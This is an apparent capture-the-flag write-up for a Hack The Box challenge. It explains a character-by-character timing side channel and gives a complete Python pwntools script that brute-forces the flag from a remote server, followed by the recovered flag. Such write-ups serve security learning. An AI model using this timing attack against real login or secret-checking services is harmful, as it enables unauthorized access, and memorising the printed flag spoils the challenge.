we are given with a file and a server to connect to. 
Upon inspecting the file, we can see the point of interest:
![[Pasted image 20251128112632.png]]
The program looks for a flag stored in its memory, then compares the user input to it character by character.
The program sleeps whenever the input is incorrect, and immediately returns an output when the input is correct, so we can bruteforce the solution by trying out each character and see if we immediately get a response:
```python
from pwn import *
import time
import string


HOST = '94.237.59.242' 
PORT = 32924        


charset = string.ascii_letters + string.digits + string.punctuation

known_flag = "HTB{"

print(f"[*] Starting Timing Attack on {HOST}:{PORT}")

while True:
    char_found = False
    
    for char in charset:
        test_flag = known_flag + char
        
        try:
            # Connect to the server
            r = remote(HOST, PORT, level='error') 

            # Wait for the "ATTEMPT YOUR SCHEMES:" prompt
            r.recvuntil(b"SCHEMES:") 

            start_time = time.time()

            # Send the test flag
            r.sendline(test_flag.encode())

            # Read the response (Blocking call)
            # We wait for the "BANISHED" or "ADVENTURE" text
            response = r.recvall(timeout=10)

            # Stop the timer
            end_time = time.time()
            elapsed = end_time - start_time
            
            r.close()

            # ANALYSIS LOGIC
            # If the server took LESS than 4 seconds, it did NOT sleep.
            # This means the character was correct!
            if elapsed < 4:
                known_flag += char
                print(f"[+] Character found! Current Flag: {known_flag}")
                char_found = True
                break # Move to the next character position
            
            # Optional: Print progress to know it's working
            print(f"[-] Tried {char} (Time: {elapsed:.2f}s) - Wrong")

        except Exception as e:
            print(f"[!] Error: {e}")
            continue

    if not char_found:
        print("[!] No matching character found. End of flag or network issue.")
        break
    
    # Check if we found the closing brace (end of flag)
    if known_flag.endswith("}"):
        print(f"\n[SUCCESS] Final Flag: {known_flag}")
        break
```
HTB{Tim1ng_z@_h0ll0w_t3ll5}